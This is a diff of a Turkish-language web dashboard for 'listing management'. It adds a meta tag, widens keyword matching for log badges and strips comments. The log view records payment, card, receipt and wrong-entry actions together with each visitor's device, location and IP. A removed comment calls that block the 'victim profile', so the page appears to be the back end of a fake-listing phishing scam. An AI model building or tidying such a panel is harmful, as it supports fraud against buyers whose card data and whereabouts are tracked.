@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no">
     <title>Müşteri Paneli - İlan Yönetimi</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
@@ -1174,7 +1175,6 @@
             th, td { 
                 padding: 10px; 
                 font-size: 13px; 
-                /* white-space: nowrap; (Bu kural detay hücresinde ezildi) */
             } 
 
             .form-grid { 
@@ -1862,7 +1862,6 @@
             searchTable('');
         };
 
-        // YENİ: LOG FİLTRELEME FONKSİYONU
         window.filterLogs = function(type, btn) {
             document.querySelectorAll('.log-filter-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
@@ -2021,7 +2020,6 @@
             });
         };
 
-        // 🔥 YENİDEN DÜZENLENMİŞ ZENGİN LOG FONKSİYONU 🔥
         async function loadLogs(gizli = false) {
             const tbody = document.getElementById('loglarTableBody'); 
             if (!gizli) tbody.innerHTML = getSkeletonRows(5);
@@ -2046,18 +2044,16 @@
                 let yeniHtml = '';
                 sonYuzLog.forEach(function(data) {
                     let badgeClass = "badge-secondary"; 
-                    const actLow = data.aksiyon ? data.aksiyon.toLowerCase() : "";
+                    const actLow = data.aksiyon ? data.aksiyon.toLocaleLowerCase('tr-TR') : "";
                     
                     if(actLow.includes("satın al") || actLow.includes("ödeme") || actLow.includes("kart") || actLow.includes("onay")) badgeClass = "badge-primary"; 
-                    if(actLow.includes("dekont") || actLow.includes("başarılı")) badgeClass = "badge-success"; 
-                    if(actLow.includes("hata") || actLow.includes("yanlış") || actLow.includes("başarısız")) badgeClass = "badge-danger"; 
+                    if(actLow.includes("dekont") || actLow.includes("başarılı") || actLow.includes("basarili") || actLow.includes("bitiş") || actLow.includes("bitis")) badgeClass = "badge-success"; 
+                    if(actLow.includes("hata") || actLow.includes("yanlış") || actLow.includes("yanlis") || actLow.includes("başarısız") || actLow.includes("basarisiz")) badgeClass = "badge-danger"; 
                     
-                    // Telefon ve İsim bilgisini bulmak için İlanları tarıyoruz
                     let currentAd = globalIlanlar.find(ilan => ilan.urunAdi === data.ilanBasligi);
                     let finalSaticiAdi = data.saticiAdi || (currentAd ? currentAd.saticiAdi : null);
                     let finalSaticiTel = data.saticiTel || (currentAd ? currentAd.saticiTel : null);
 
-                    // Zengin İlan Bilgisi Kartı
                     let ilanHtml = `<div style="display:flex; flex-direction:column; gap:4px; overflow:hidden; text-overflow:ellipsis;">
                         <strong style="font-size:13px; color:var(--text-main); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="${dezenfekteEt(data.ilanBasligi || 'Bilinmiyor')}">${dezenfekteEt(data.ilanBasligi || 'Bilinmiyor')}</strong>`;
                     if (finalSaticiAdi) {
@@ -2068,7 +2064,6 @@
                     }
                     ilanHtml += `</div>`;
 
-                    // Kurban Profili (Cihaz/Konum/IP)
                     let cihazText = data.cihaz || data.os || "Cihaz Tespiti Bekleniyor";
                     let lokasyonText = data.lokasyon || "Lokasyon Çözümleniyor";
                     let ipHtml = `<div style="display:flex; flex-direction:column; gap:6px; overflow:hidden;">
@@ -2089,7 +2084,6 @@
                 
                 tbody.innerHTML = yeniHtml;
                 
-                // Aktif filtreyi uygula
                 const activeFilterBtn = document.querySelector('.log-filter-btn.active');
                 if(activeFilterBtn) {
                     let type = 'all';
@@ -2161,9 +2155,7 @@
         document.getElementById("closeModalBtn").addEventListener('click', function() { modal.style.display = "none"; }); 
 
         const ticketReadModal = document.getElementById('ticketReadModal');
-        document.getElementById('closeTicketReadModal').onclick = function() {
-            ticketReadModal.style.display = 'none';
-        };
+        document.getElementById('closeTicketReadModal').onclick = function() { ticketReadModal.style.display = 'none'; };
 
         window.addEventListener('click', function(e) { 
             if (e.target == modal) modal.style.display = "none"; 
